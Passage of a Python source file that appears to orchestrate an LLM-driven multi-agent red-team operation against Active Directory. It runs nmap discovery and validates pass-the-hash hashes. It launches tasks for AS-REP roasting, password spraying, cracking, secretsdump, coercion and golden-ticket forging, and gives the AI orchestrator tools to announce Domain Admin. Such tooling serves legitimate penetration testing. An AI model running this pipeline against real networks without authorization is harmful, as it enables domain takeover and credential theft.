"""Main orchestrator for multi-agent red team operations.

This module provides the entry point for coordinating multi-agent
red team operations in a Kubernetes environment.
"""

from __future__ import annotations

import asyncio
import hashlib
import os
import re
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import dreadnode as dn
import rigging as rg
from dreadnode.agent import Agent, Thread
from dreadnode.agent.stop import tool_use
from loguru import logger
from tenacity import (
    retry,
    retry_if_exception_type,
    stop_after_attempt,
    wait_random_exponential,
)

from ares.core.config import (
    get_agent_config,
    get_crack_task_grace_period,
    get_max_runtime,
    get_namespace,
    get_rate_limit_backoff_delays,
    get_rate_limit_max_retries,
    get_redis_url,
    get_stop_on_domain_admin,
)
from ares.core.dispatcher import RedTeamDispatcher
from ares.core.factories.red_agents import (
    create_role_hooks,
    load_agent_instructions,
)
from ares.core.models import (
    AgentInfo,
    AgentRole,
    Credential,
    Host,
    SharedRedTeamState,
    Target,
    TaskStatus,
)
from ares.core.recovery import OperationRecoveryManager, RecoveryError
from ares.core.task_queue import RedisTaskQueue
from ares.core.workflows import exploitation_workflow
from ares.reports.redteam import RedTeamReportGenerator
from ares.tools.red.orchestrator import OrchestratorTools


def _resolve_model_generator(model: str, openai_api_key: str | None) -> str | rg.Generator:
    if not openai_api_key:
        return model
    if not model.startswith(("gpt-", "openai/")):
        return model
    try:
        generator = rg.get_generator(model)
    except Exception:
        return model
    if hasattr(generator, "api_key"):
        generator.api_key = openai_api_key
    return generator


def _resolve_orchestrator_model(model: str | None) -> str:
    resolved = model or os.getenv("ARES_ORCHESTRATOR_MODEL") or os.getenv("ARES_MODEL")
    if not resolved:
        raise ValueError(
            "No model specified for operation. Provide a model argument or set "
            "ARES_ORCHESTRATOR_MODEL/ARES_MODEL in the environment."
        )
    return resolved


def _is_pass_the_hash_compatible(hash_value: str, hash_type: str | None) -> bool:
    if not hash_value:
        return False
    normalized_type = (hash_type or "").strip().upper()
    if normalized_type and normalized_type not in {"NTLM", "LM", "NTLMV1", "NTLMV2"}:
        return False
    value = hash_value.strip()
    if "$" in value:
        return False
    if ":" in value:
        parts = value.split(":")
        if len(parts) != 2:
            return False
        lm_part, ntlm_part = parts
        if lm_part and not re.fullmatch(r"[0-9a-fA-F]{32}", lm_part):
            return False
        return bool(re.fullmatch(r"[0-9a-fA-F]{32}", ntlm_part))
    return bool(re.fullmatch(r"[0-9a-fA-F]{32}", value))


async def _wait_for_required_workers(
    dispatcher: RedTeamDispatcher,
    required_roles: list[str],
    timeout: float = 120.0,
) -> bool:
    """
    Wait for required worker agents to come online.

    Args:
        dispatcher: The dispatcher instance
        required_roles: List of roles that must be online (e.g., ["recon"])
        timeout: Maximum time to wait in seconds

    Returns:
        True if all required workers came online, False if timeout
    """
    import time

    start = time.time()

    logger.info(f"Waiting for required workers: {required_roles}")

    while time.time() - start < timeout:
        status = dispatcher.get_agent_status()
        online_roles = {
            info["role"] for name, info in status.items() if info["status"] != "offline"
        }

        missing = set(required_roles) - online_roles
        if not missing:
            logger.success(f"All required workers online: {required_roles}")
            return True

        elapsed = time.time() - start
        logger.debug(f"Waiting for workers: {missing} (elapsed: {elapsed:.0f}s)")
        await asyncio.sleep(5)

    logger.error(
        f"Timeout waiting for workers after {timeout}s. "
        f"Missing: {set(required_roles) - online_roles}"
    )
    return False


async def _load_or_initialize_state(
    dispatcher: RedTeamDispatcher,
    recovery: OperationRecoveryManager,
    operation_id: str,
    resume_from_checkpoint: bool,
    target_domain: str,
    target_ips: list[str],
    initial_credential: Credential | None,
) -> None:
    if resume_from_checkpoint:
        try:
            state, requeued_task_ids = await recovery.recover_operation(operation_id)
            dispatcher._shared_state = state
            # Requeued tasks are already in pending_tasks (restored from checkpoint)
            # which the result consumer polls automatically
            if requeued_task_ids:
                logger.info(f"Recovered {len(requeued_task_ids)} pending tasks from checkpoint")
            if state.all_credentials or state.all_hashes:
                dispatcher.signal_credential_access()
            logger.info(f"Resumed operation {operation_id} from checkpoint")
            return
        except RecoveryError:
            logger.warning(f"No checkpoint found for {operation_id}, starting fresh")

    state = dispatcher.shared_state
    # Enable real-time publishing of discoveries to Redis
    state.set_dispatcher(dispatcher)
    state.target = Target(
        ip=target_ips[0] if target_ips else "",
        domain=target_domain,
    )
    if target_domain:
        state.add_domain(target_domain)

    # Add all target IPs as placeholder hosts so scanners can track them
    # Services will be merged when recon discovers them
    for ip in target_ips:
        placeholder_host = Host(ip=ip, hostname="", os="Unknown", roles=[], services=[])
        state.add_host(placeholder_host)
    if target_ips:
        logger.info(f"Added {len(target_ips)} target IPs as placeholder hosts")

    if initial_credential:
        state.add_credential(initial_credential, "initial")
        dispatcher.signal_credential_access()


async def _register_agents(
    dispatcher: RedTeamDispatcher,
    agents: dict[AgentRole, AgentInfo],
) -> None:
    for agent_info in agents.values():
        await dispatcher.register(agent_info)


async def _ensure_required_workers(
    dispatcher: RedTeamDispatcher,
    required_roles: list[str],
    timeout: float = 120.0,
) -> None:
    if not await _wait_for_required_workers(dispatcher, required_roles, timeout=timeout):
        raise RuntimeError(
            f"Required workers ({', '.join(required_roles)}) did not come online within "
            f"{timeout:.0f} seconds. Ensure worker pods are deployed and running."
        )


def _parse_nmap_report_header(host_line: str) -> tuple[str, str]:
    """Parse IP and hostname from nmap report header line."""
    ip_match = re.match(r"(.+) \((\d+\.\d+\.\d+\.\d+)\)$", host_line)
    if ip_match:
        return ip_match.group(2), ip_match.group(1).strip()
    ip_only = re.match(r"^(\d+\.\d+\.\d+\.\d+)$", host_line)
    if ip_only:
        return ip_only.group(1), ""
    return "", host_line


def _parse_nmap_service_line(line: str, current: dict) -> None:
    """Parse service/port line and update current host dict."""
    svc_match = re.match(r"^(\d+)/(tcp|udp)\s+open\s+([^\s]+)", line)
    if svc_match:
        current["services"].append(
            f"{svc_match.group(1)}/{svc_match.group(2)} {svc_match.group(3)}"
        )
    domain_match = re.search(r"\(Domain:\s*([^,)]+)", line)
    if domain_match and not current["domain"]:
        current["domain"] = domain_match.group(1).strip()
    if "Service Info:" in line:
        host_match = re.search(r"Host:\s*([^;]+)", line)
        if host_match:
            current["hostname"] = host_match.group(1).strip()
        os_match = re.search(r"OS:\s*([^;]+)", line)
        if os_match and not current["os"]:
            current["os"] = os_match.group(1).strip()


def _build_host_from_nmap(current: dict) -> Host | None:
    """Build Host object from parsed nmap data."""
    if not current["ip"]:
        return None
    hostname = current["hostname"]
    if hostname and current["domain"] and "." not in hostname:
        hostname = f"{hostname.lower()}.{current['domain'].lower()}"
    services_lower = [s.lower() for s in current["services"]]
    is_dc = any("ldap" in s for s in services_lower) and any(
        "kerberos" in s for s in services_lower
    )
    host = Host(
        ip=current["ip"],
        hostname=hostname,
        os=current["os"] or "Unknown",
        roles=["AD DC"] if is_dc else [],
        services=current["services"],
    )
    if is_dc:
        host.is_dc = True
    return host


def _parse_nmap_hosts(output: str) -> list[Host]:
    """Parse nmap output into Host objects."""
    hosts: list[Host] = []
    current = {"ip": "", "hostname": "", "os": "", "domain": "", "services": []}

    for raw_line in output.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        report_match = re.match(r"^Nmap scan report for (.+)$", line)
        if report_match:
            host = _build_host_from_nmap(current)
            if host:
                hosts.append(host)
            current["ip"], current["hostname"] = _parse_nmap_report_header(report_match.group(1))
            current["os"], current["domain"], current["services"] = "", "", []
        elif current["ip"]:
            _parse_nmap_service_line(line, current)

    host = _build_host_from_nmap(current)
    if host:
        hosts.append(host)
    return hosts


async def _run_nmap_on_worker(targets: list[str], namespace: str) -> tuple[str, list[Host]]:
    """Run nmap on a recon worker pod via kubectl exec.

    Three-phase scan:
    1. Fast port discovery (top 100 ports)
    2. Service version detection on discovered ports
    3. NetBIOS hostname enrichment for hosts without hostnames
    """
    from ares.core.k8s_executor import KubernetesPodExecutor

    if not targets:
        return "", []

    executor = KubernetesPodExecutor(namespace=namespace, in_cluster=True)

    logger.info(f"[DIRECT NMAP] Phase 1: Fast port discovery on {len(targets)} targets")

    # Phase 1: Fast port scan
    port_cmd = ["nmap", "-Pn", "-sT", "-T4", "--open", "--top-ports", "100"] + targets
    try:
        stdout, stderr, returncode = await executor.execute(
            role="recon", command=port_cmd, timeout_seconds=120
        )
        if returncode != 0:
            logger.warning(f"[DIRECT NMAP] Port scan failed: {stderr[:200]}")
            return stderr, []
        port_output = stdout
    except Exception as e:
        logger.warning(f"[DIRECT NMAP] Port scan error: {e}")
        return str(e), []

    # Parse open ports
    open_ports = set()
    for match in re.finditer(r"(\d+)/tcp\s+open", port_output):
        open_ports.add(match.group(1))

    if not open_ports:
        logger.info("[DIRECT NMAP] No open ports found")
        hosts = _parse_nmap_hosts(port_output)
        return port_output, hosts

    ports_str = ",".join(sorted(open_ports, key=int))
    logger.info(f"[DIRECT NMAP] Phase 2: Service detection on {len(open_ports)} ports: {ports_str}")

    # Phase 2: Service version detection
    svc_cmd = ["nmap", "-Pn", "-sT", "-T4", "--open", "-sV", "-p", ports_str] + targets
    try:
        stdout, stderr, returncode = await executor.execute(
            role="recon", command=svc_cmd, timeout_seconds=300
        )
        if returncode != 0:
            logger.warning(f"[DIRECT NMAP] Service scan had issues: {stderr[:200]}")
            # Use port scan results
            hosts = _parse_nmap_hosts(port_output)
            return port_output, hosts
        svc_output = stdout
    except Exception as e:
        logger.warning(f"[DIRECT NMAP] Service scan error: {e}, using port scan results")
        hosts = _parse_nmap_hosts(port_output)
        return port_output, hosts

    logger.info(f"[DIRECT NMAP] Scan completed for {len(targets)} targets")
    hosts = _parse_nmap_hosts(svc_output)

    # Phase 3: NetBIOS hostname enrichment for hosts without hostnames
    hosts_needing_enrichment = [
        h
        for h in hosts
        if not h.hostname
        or (h.hostname.lower().startswith("ip-") and "compute.internal" in h.hostname.lower())
    ]
    if hosts_needing_enrichment:
        logger.info(
            f"[DIRECT NMAP] Phase 3: NetBIOS hostname resolution for "
            f"{len(hosts_needing_enrichment)} host(s)"
        )
        for host in hosts_needing_enrichment:
            try:
                # Use nmap nbstat script for NetBIOS name resolution
                nbstat_cmd = ["nmap", "-Pn", "-sU", "-p", "137", "--script", "nbstat", host.ip]
                nb_stdout, _nb_stderr, nb_rc = await executor.execute(
                    role="recon", command=nbstat_cmd, timeout_seconds=15
                )
                if nb_rc == 0 and nb_stdout:
                    # Parse FQDN from "Nmap scan report for hostname.domain (IP)"
                    fqdn_match = re.search(
                        r"Nmap scan report for ([^\s]+)\s+\(" + re.escape(host.ip) + r"\)",
                        nb_stdout,
                    )
                    if fqdn_match:
                        resolved_hostname = fqdn_match.group(1).strip()
                        # Skip AWS internal hostnames
                        if not (
                            resolved_hostname.lower().startswith("ip-")
                            and "compute.internal" in resolved_hostname.lower()
                        ):
                            host.hostname = resolved_hostname
                            logger.info(
                                f"[DIRECT NMAP] Resolved hostname for {host.ip}: {resolved_hostname}"
                            )
                            continue

                    # Fallback: parse NetBIOS name from nbstat output
                    nb_match = re.search(r"nbstat:\s*NetBIOS name:\s*([^,]+)", nb_stdout)
                    if nb_match:
                        netbios_name = nb_match.group(1).strip()
                        # Try to find domain from Names section
                        # Format: "|     DOMAIN<00>  Flags: <group>" (nmap nbstat output)
                        domain_match = re.search(
                            r"^\|?\s+([A-Z0-9_-]+)<00>\s+Flags:.*<group>",
                            nb_stdout,
                            re.MULTILINE,
                        )
                        if domain_match:
                            domain = domain_match.group(1).strip().lower()
                            host.hostname = f"{netbios_name.lower()}.{domain}.local"
                        else:
                            host.hostname = netbios_name.lower()
                        logger.info(
                            f"[DIRECT NMAP] Resolved NetBIOS name for {host.ip}: {host.hostname}"
                        )
            except Exception as e:
                logger.debug(f"[DIRECT NMAP] NetBIOS resolution failed for {host.ip}: {e}")

    return svc_output, hosts


async def _run_direct_nmap(
    state: SharedRedTeamState,
    target_ips: list[str],
    namespace: str,
) -> None:
    """Run nmap directly (not via LLM task queue) and add hosts to state.

    This runs BEFORE the LLM orchestrator starts, ensuring host discovery
    doesn't get stuck behind slow LLM-guided tasks in the worker queue.
    Uses kubectl exec to run nmap on a recon worker pod.
    """
    if not target_ips:
        return

    # Filter already-scanned targets
    unscanned = [ip for ip in target_ips if ip not in state.scanned_targets]
    if not unscanned:
        logger.info(f"[DIRECT NMAP] All {len(target_ips)} targets already scanned")
        return

    logger.info(f"[DIRECT NMAP] Running nmap via kubectl exec on {len(unscanned)} targets")

    try:
        _output, hosts = await _run_nmap_on_worker(unscanned, namespace)
    except Exception as e:
        logger.warning(f"[DIRECT NMAP] Failed to run nmap: {e}")
        return

    # Add hosts to state
    for host in hosts:
        state.add_host(host)

    # Mark targets as scanned
    for ip in unscanned:
        state.scanned_targets.add(ip)

    # Persist to backend if available
    if state._backend:
        try:
            await state._backend.set_meta("nmap_completed", "true")
        except Exception as e:
            logger.warning(f"[DIRECT NMAP] Failed to persist nmap completion: {e}")

    dc_count = sum(1 for h in hosts if h.is_dc)
    logger.success(
        f"[DIRECT NMAP] Discovered {len(hosts)} hosts ({dc_count} DCs) "
        f"from {len(unscanned)} targets"
    )


async def _prime_operation(
    recovery: OperationRecoveryManager,
    dispatcher: RedTeamDispatcher,
    target_ips: list[str],
    target_domain: str,
) -> None:
    """Initialize operation state in Redis so workers can discover it.

    With Redis-native state backend, state persists immediately on mutation.
    This function writes initial metadata to mark the operation as active,
    including setting the active operation pointer for worker discovery.
    """
    state = dispatcher.shared_state
    operation_id = state.operation_id
    if state._backend:
        # Set started_at timestamp so workers can determine operation freshness
        now = datetime.now(timezone.utc)
        await state._backend.set_meta("started_at", now.isoformat())
        await state._backend.set_meta("initialized", value=True)

        # Store target info so CLI can reconstruct state
        if target_ips:
            await state._backend.set_meta("target_ip", target_ips[0])
            await state._backend.set_meta("target_ips", ",".join(target_ips))
        if target_domain:
            await state._backend.set_meta("target_domain", target_domain)

        # Set the active operation pointer for worker discovery
        # This allows workers to find the operation immediately via the pointer
        # instead of scanning and potentially rejecting based on stale timestamps
        try:
            await state._backend._redis.set("ares:op:active", operation_id)
            logger.info(f"Set active operation pointer: {operation_id}")
        except Exception as e:
            logger.warning(f"Failed to set active operation pointer: {e}")

        logger.info("Operation state initialized in Redis - workers can discover operation")
    else:
        logger.warning("No state backend configured - operation may not be discoverable")

    # NOTE: NMAP and immediate AS-REP dispatch moved to run_multi_agent_operation()
    # before background tasks are created, to prevent race conditions


def _is_rate_limit_error(error: Exception | str) -> bool:
    """Check if error is a rate limit error that should be retried quickly."""
    error_str = str(error).lower()
    return any(
        pattern in error_str
        for pattern in [
            "rate limit",
            "ratelimit",
            "rate_limit",
            "too many requests",
            "429",
            "tokens per min",
            "tpm",
            "requests per min",
            "rpm",
        ]
    )


def _log_orchestrator_result(result: rg.RunResult, model: str) -> None:
    logger.success(
        f"✅ Model connection successful: {model} "
        f"(messages: {len(result.messages)}, tokens: {result.usage})"
    )
    log_fn = logger.error if result.stop_reason == "error" else logger.success
    log_msg = (
        f"Orchestrator failed after {result.steps} steps: {result.error}"
        if result.stop_reason == "error"
        else f"Orchestrator completed: {result.steps} steps, {result.stop_reason}"
    )
    log_fn(log_msg)


def _create_completion_tools(
    shared_state: SharedRedTeamState,
    dispatcher: RedTeamDispatcher,
) -> tuple[Any, Any]:
    """
    Create the completion tools that can access shared state.

    These tools are used as stop conditions for the orchestrator agent.
    They need to modify the shared state, so we create them as closures.

    Returns:
        Tuple of (complete_operation, announce_domain_admin) tools
    """

    @dn.tool
    def complete_operation(summary: str) -> str:
        """
        Mark the multi-agent red team operation as complete.

        Use this tool when you have:
        - Achieved domain admin access OR exhausted all attack paths
        - Coordinated with all specialized agents
        - Collected all available credentials and hashes
        - Generated golden ticket (if krbtgt hash was found)

        Args:
            summary: Executive summary of the operation including:
                - All domain administrators compromised
                - Attack paths used
                - Total credentials obtained
                - Hosts compromised
                - Key vulnerabilities exploited

        Returns:
            Confirmation message

        Example:
            >>> complete_operation("Domain admin achieved via ADCS ESC1...")
        """
        shared_state.completed = True
        logger.success(f"🎯 Multi-agent operation completed: {summary}")
        return f"✓ Operation marked as complete. Summary: {summary}"

    @dn.tool
    async def announce_domain_admin(
        domain: str,
        username: str,
        credential_type: str,
        attack_path: str,
    ) -> str:
        """
        Announce successful achievement of Domain Admin privileges.

        Use this tool when you have confirmed Domain Admin access through:
        - Valid DA credentials (password or hash)
        - Forged Golden Ticket with krbtgt hash
        - Successful DA-level command execution (e.g., DCSync, remote code execution on DC)

        Args:
            domain: Target domain name
            username: Domain Admin username achieved
            credential_type: Type of credential (password, hash, golden_ticket)
            attack_path: Brief description of the attack path used to achieve DA

        Returns:
            Confirmation message

        Example:
            >>> await announce_domain_admin(
            ...     domain="contoso.local",
            ...     username="Administrator",
            ...     credential_type="password",
            ...     attack_path="ADCS ESC1 exploit -> cert auth"
            ... )
        """
        await dispatcher.announce_domain_admin(
            username=username,
            domain=domain,
            attack_path=attack_path,
            credential_type=credential_type,
            source_agent="ares-orchestrator",
        )
        logger.success(
            f"🎯 DOMAIN ADMIN ACHIEVED! Domain: {domain}, User: {username}, "
            f"Type: {credential_type}, Path: {attack_path}"
        )
        return (
            f"✓ Domain Admin access confirmed for {domain}\\{username} "
            f"via {credential_type} (attack path: {attack_path})"
        )

    return complete_operation, announce_domain_admin


async def run_multi_agent_operation(
    operation_id: str,
    target_domain: str,
    target_ips: list[str],
    initial_credential: Credential | None = None,
    resume_from_checkpoint: bool = False,
    redis_url: str | None = None,
    namespace: str | None = None,
    model: str | None = None,
    max_steps: int = 200,
    checkpoint_interval: int = 60,
    openai_api_key: str | None = None,
    report_dir: str | Path | None = None,
    max_runtime: float | None = None,
) -> dict[str, Any]:
    """
    Main entry point for multi-agent red team operations.

    Args:
        operation_id: Unique identifier for this operation
        target_domain: Target domain (e.g., "contoso.local")
        target_ips: List of target IPs to scan
        initial_credential: Optional initial credential
        resume_from_checkpoint: Resume from previous checkpoint
        redis_url: Redis URL for state persistence (default: derived from config)
        namespace: Kubernetes namespace (default: from config)
        model: LLM model to use
        max_steps: Maximum agent steps
        checkpoint_interval: Seconds between checkpoints
        openai_api_key: Optional OpenAI API key to bind directly to the generator
        report_dir: Directory to write the final report (default: ./reports)
        max_runtime: Maximum runtime in seconds (default: 1800s / 30 min, via ARES_MAX_RUNTIME env)

    Returns:
        Operation results summary
    """
    # Apply rigging patches for case-insensitive tool parameters
    from ares.core.rigging_patches import apply as apply_rigging_patches

    apply_rigging_patches()

    # Initialize replay system if configured
    from ares.core.config import (
        get_replay_fallback,
        get_replay_file,
        get_replay_mode,
        get_replay_seed,
    )
    from ares.core.replay import initialize_replay

    replay_mode = get_replay_mode()
    if replay_mode:
        replay_file = get_replay_file()
        if replay_file:
            from pathlib import Path

            base_path = Path(replay_file).parent
            base_path.mkdir(parents=True, exist_ok=True)
            replay_file = str(base_path / "orchestrator.jsonl")

        initialize_replay(
            mode=replay_mode,
            path=replay_file,
            seed=get_replay_seed(),
            fallback=get_replay_fallback(),
        )

    # Resolve max runtime from parameter, env, or default
    resolved_max_runtime = max_runtime if max_runtime is not None else get_max_runtime()
    # Resolve config defaults
    redis_url = redis_url or get_redis_url()
    namespace = namespace or get_namespace()
    model = _resolve_orchestrator_model(model)

    start_time = datetime.now(timezone.utc)

    # Initialize infrastructure
    dispatcher = RedTeamDispatcher(redis_url=redis_url)
    await dispatcher.start(operation_id)

    # Acquire exclusive operation lock
    # Force acquire when resuming from checkpoint (stale lock from crashed orchestrator)
    task_queue = RedisTaskQueue(redis_url)
    await task_queue.connect()

    if not await task_queue.acquire_operation_lock(operation_id, force=resume_from_checkpoint):
        await task_queue.disconnect()
        raise RuntimeError(
            f"Operation {operation_id} is already running by another orchestrator. "
            "Use a different operation_id or wait for the existing operation to complete."
        )

    recovery = OperationRecoveryManager(
        redis_url=redis_url,
        checkpoint_interval=checkpoint_interval,
    )
    await recovery.start()

    # Resume or create new operation
    await _load_or_initialize_state(
        dispatcher=dispatcher,
        recovery=recovery,
        operation_id=operation_id,
        resume_from_checkpoint=resume_from_checkpoint,
        target_domain=target_domain,
        target_ips=target_ips,
        initial_credential=initial_credential,
    )

    # Create agent ensemble
    agents = await _create_agent_ensemble(
        dispatcher=dispatcher,
        model=model,
        max_steps=max_steps,
        namespace=namespace,
    )

    # Register all agents with dispatcher
    await _register_agents(dispatcher, agents)

    # Wait for required workers before starting
    await _ensure_required_workers(dispatcher, ["recon"], timeout=120.0)

    # Run NMAP to discover hosts before background tasks start
    state = dispatcher.shared_state
    if target_ips:
        namespace = get_namespace()
        await _run_direct_nmap(state, target_ips, namespace)

    # Start background tasks
    # - Credential access (AS-REP, password spray, etc.) handled by _auto_credential_access
    # - No periodic checkpoint needed - state persists directly to Redis via RedisStateBackend
    tasks = [
        asyncio.create_task(_monitor_agent_health(dispatcher), name="health_monitor"),
        asyncio.create_task(exploitation_workflow(dispatcher), name="exploitation_workflow"),
        asyncio.create_task(_extend_operation_lock(task_queue, operation_id), name="lock_extender"),
        asyncio.create_task(
            _auto_credential_expansion(dispatcher), name="auto_credential_expansion"
        ),
        asyncio.create_task(_auto_credential_access(dispatcher), name="auto_credential_access"),
        asyncio.create_task(_auto_crack_dispatch(dispatcher), name="auto_crack_dispatch"),
        asyncio.create_task(_auto_mssql_detection(dispatcher), name="auto_mssql_detection"),
        asyncio.create_task(_auto_adcs_enumeration(dispatcher), name="auto_adcs_enumeration"),
        asyncio.create_task(_auto_share_spider(dispatcher), name="auto_share_spider"),
        asyncio.create_task(_auto_bloodhound(dispatcher), name="auto_bloodhound"),
        asyncio.create_task(_auto_coercion(dispatcher), name="auto_coercion"),
        asyncio.create_task(
            _auto_delegation_enumeration(dispatcher), name="auto_delegation_enumeration"
        ),
        asyncio.create_task(
            _auto_local_admin_secretsdump(dispatcher), name="auto_local_admin_secretsdump"
        ),
        asyncio.create_task(_auto_golden_ticket(dispatcher), name="auto_golden_ticket"),
    ]

    # Build initial prompt for orchestrator
    initial_prompt = _build_orchestrator_prompt(
        target_domain=target_domain,
        target_ips=target_ips,
        initial_credential=initial_credential,
    )

    try:
        # Do initial checkpoint so workers can discover the operation.
        await _prime_operation(recovery, dispatcher, target_ips, target_domain)

        # Check if DA was already achieved (e.g., recovery after restart) and should stop
        if dispatcher.shared_state.has_domain_admin and get_stop_on_domain_admin():
            logger.info("DA already achieved and stop_on_domain_admin=True; marking complete")
            dispatcher.shared_state.completed = True
            await dispatcher._checkpoint()

        # Create the orchestrator agent with tools
        orchestrator_agent = await _create_orchestrator_agent(
            dispatcher=dispatcher,
            model=model,
            max_steps=max_steps,
            openai_api_key=openai_api_key,
        )

        logger.info(f"Starting orchestrator for {target_domain}")
        logger.info(f"Initial prompt:\n{initial_prompt}")

        # NOTE: Initial reconnaissance is dispatched by the orchestrator agent
        # through its template instructions (dispatch_recon). The orchestrator
        # coordinates all work through dispatch tools, not direct execution.

        # Run the orchestrator agent - this drives the entire operation
        # Track crash and rate limit attempts to prevent infinite loops
        orchestrator_crash_count = 0
        max_orchestrator_crashes = 3
        rate_limit_count = 0
        rate_limit_max_retries = get_rate_limit_max_retries()
        rate_limit_delays = get_rate_limit_backoff_delays()
        redis_retry_count = 0
        max_redis_retries = 5
        result = None

        with dn.run(tags=["multi-agent-operation", target_domain]):
            dn.log_params(
                model=model,
                operation_id=operation_id,
                target_domain=target_domain,
                target_ips=target_ips,  # type: ignore[arg-type]
                max_steps=max_steps,
            )

            # Run the orchestrator agent with crash and rate limit recovery
            while orchestrator_crash_count < max_orchestrator_crashes:
                try:
                    logger.info(f"🤖 Connecting to {model}...")
                    result = await orchestrator_agent.run(initial_prompt)
                    _log_orchestrator_result(result, model)

                    # Check if result indicates a fatal error (e.g., auth failure)
                    if result.stop_reason == "error":
                        error_msg = str(result.error) if result.error else "Unknown error"
                        # Auth errors are fatal - no point retrying with bad credentials
                        if "AuthenticationError" in error_msg or "invalid" in error_msg.lower():
                            raise RuntimeError(f"Fatal authentication error: {error_msg}")
                        # Rate limit errors in result - handle inline to avoid extra exception
                        if _is_rate_limit_error(error_msg):
                            rate_limit_count += 1
                            if rate_limit_count <= rate_limit_max_retries:
                                delay_idx = min(rate_limit_count - 1, len(rate_limit_delays) - 1)
                                delay = rate_limit_delays[delay_idx]
                                logger.warning(
                                    f"⏳ Rate limit in result "
                                    f"(attempt {rate_limit_count}/{rate_limit_max_retries}), "
                                    f"backing off {delay}s: {error_msg}"
                                )
                                await asyncio.sleep(delay)
                                continue  # Retry without incrementing crash count
                        # Other errors - treat as crash and let retry logic handle
                        raise RuntimeError(f"Orchestrator returned error: {error_msg}")

                    break  # Success - exit the retry loop
                except Exception as e:
                    error_str = str(e)

                    # Auth errors are fatal - never retry with bad credentials
                    if (
                        "Fatal authentication error" in error_str
                        or "AuthenticationError" in error_str
                    ):
                        logger.error(f"Authentication failed - cannot continue: {e}")
                        raise

                    # Rate limit errors get special treatment with fast retry
                    # They should be retried even without progress since they're transient
                    if _is_rate_limit_error(e):
                        rate_limit_count += 1
                        if rate_limit_count <= rate_limit_max_retries:
                            # Use shorter backoff for rate limits (default: 1, 2, 4 seconds)
                            delay_idx = min(rate_limit_count - 1, len(rate_limit_delays) - 1)
                            delay = rate_limit_delays[delay_idx]
                            logger.warning(
                                f"⏳ Rate limit hit (attempt {rate_limit_count}/{rate_limit_max_retries}), "
                                f"backing off {delay}s: {e}"
                            )
                            await asyncio.sleep(delay)
                            continue  # Retry without incrementing crash count
                        # Exhausted rate limit retries - treat as crash
                        logger.error(
                            f"Rate limit retries exhausted ({rate_limit_count} attempts), "
                            "treating as crash"
                        )
                        # Fall through to crash handling

                    # Redis connection errors get special treatment - retry with backoff
                    # These are transient and should be retried even without progress
                    redis_error_keywords = [
                        "timeout",
                        "connection",
                        "connect",
                        "closed",
                        "broken pipe",
                        "reset",
                        "refused",
                        "sentinel",
                    ]
                    if any(kw in error_str.lower() for kw in redis_error_keywords):
                        redis_retry_count += 1
                        if redis_retry_count <= max_redis_retries:
                            # Exponential backoff: 2, 4, 8, 16, 32 seconds
                            delay = min(2**redis_retry_count, 32)
                            logger.warning(
                                f"⏳ Redis connection error (attempt {redis_retry_count}/{max_redis_retries}), "
                                f"backing off {delay}s: {e}"
                            )
                            await asyncio.sleep(delay)
                            continue  # Retry without incrementing crash count
                        # Exhausted Redis retries - treat as crash
                        logger.error(
                            f"Redis retries exhausted ({redis_retry_count} attempts), "
                            "treating as crash"
                        )
                        # Fall through to crash handling

                    orchestrator_crash_count += 1
                    state = dispatcher.shared_state
                    has_progress = len(state.all_credentials) > 0 or len(state.all_hashes) > 0

                    logger.error(
                        f"Orchestrator crashed (attempt {orchestrator_crash_count}/{max_orchestrator_crashes}): {e}",
                        exc_info=True,
                    )

                    if has_progress and orchestrator_crash_count < max_orchestrator_crashes:
                        logger.warning(
                            f"Orchestrator crashed but has progress ({len(state.all_credentials)} creds, "
                            f"{len(state.all_hashes)} hashes). Continuing background tasks and retrying..."
                        )
                        # Give background tasks time to work before retrying
                        await asyncio.sleep(30)
                    elif not has_progress:
                        # No progress - fail fast
                        raise
                    else:
                        # Max crashes reached with progress - continue without orchestrator
                        logger.warning(
                            f"Orchestrator crashed {max_orchestrator_crashes} times. "
                            "Continuing with background tasks only."
                        )
                        break

        # Handle case where result is None (all retries failed but we have progress)
        if result is None:
            # Create a synthetic stop reason for the completion logic below
            class SyntheticResult:
                stop_reason = "orchestrator_crashed"
                steps = 0
                error = "Orchestrator crashed after max retries"

            result = SyntheticResult()  # type: ignore[assignment]

        stop_reason = getattr(result, "stop_reason", None)
        if (
            stop_reason == "max_steps_reached"
            and not dispatcher.shared_state.pending_tasks
            and not dispatcher.shared_state.completed
        ):
            pending_plaintext = bool(
                getattr(dispatcher.shared_state, "pending_credential_findings", set())
            )
            if pending_plaintext:
                logger.warning(
                    f"Orchestrator stopped ({stop_reason}) but pending plaintext credentials exist; "
                    "keeping operation open"
                )
            else:
                dispatcher.shared_state.completed = True
                logger.warning(
                    f"Orchestrator stopped ({stop_reason}) with no pending tasks; marking operation complete"
                )

        exploitation_status = await dispatcher.get_exploitation_status()
        if not dispatcher.shared_state.completed:
            has_pending_vulns = bool(exploitation_status.get("pending"))
            if not dispatcher.shared_state.pending_tasks and not has_pending_vulns:
                pending_plaintext = bool(
                    getattr(dispatcher.shared_state, "pending_credential_findings", set())
                )
                if pending_plaintext:
                    logger.warning("Pending plaintext credentials exist; keeping operation open")
                else:
                    dispatcher.shared_state.completed = True
                    if stop_reason == "error":
                        logger.warning(
                            "Orchestrator stopped with error; no pending tasks or unexploited "
                            "vulnerabilities, marking operation complete"
                        )
                    else:
                        logger.info(
                            "No pending tasks or unexploited vulnerabilities; marking operation complete"
                        )

        if dispatcher.shared_state.completed:
            # Log DA status if achieved before the wait loop
            if dispatcher.shared_state.has_domain_admin:
                logger.success(
                    f"Domain Admin achieved! (detected before wait loop) "
                    f"Path: {dispatcher.shared_state.domain_admin_path or 'unknown'}"
                )
            logger.info("Operation marked complete; skipping post-run wait")
            # Still wait for golden ticket if DA was achieved (same as _wait_for_completion does)
            # This is critical: _wait_for_completion() calls _wait_for_golden_ticket(), but when
            # the orchestrator marks the operation complete (no pending tasks), we skip it.
            # We must still forge the golden ticket before exiting!
            await _wait_for_golden_ticket(dispatcher)
            # Still wait for running crack tasks to complete
            await _wait_for_crack_tasks(dispatcher)
        else:
            # Wait for any remaining background tasks
            await _wait_for_completion(dispatcher, tasks, max_runtime=resolved_max_runtime)

        exploitation_status = await dispatcher.get_exploitation_status()

        # Get final state
        final_state = dispatcher.shared_state
        end_time = datetime.now(timezone.utc)

        report_path = None
        report_markdown = None
        try:
            report_path, report_markdown = _generate_multi_agent_report(
                final_state,
                report_dir=report_dir,
                exploitation_status=exploitation_status,
            )
            # Persist report to Redis for CLI access
            if report_markdown and final_state._backend:
                await final_state._backend.store_report(report_markdown)
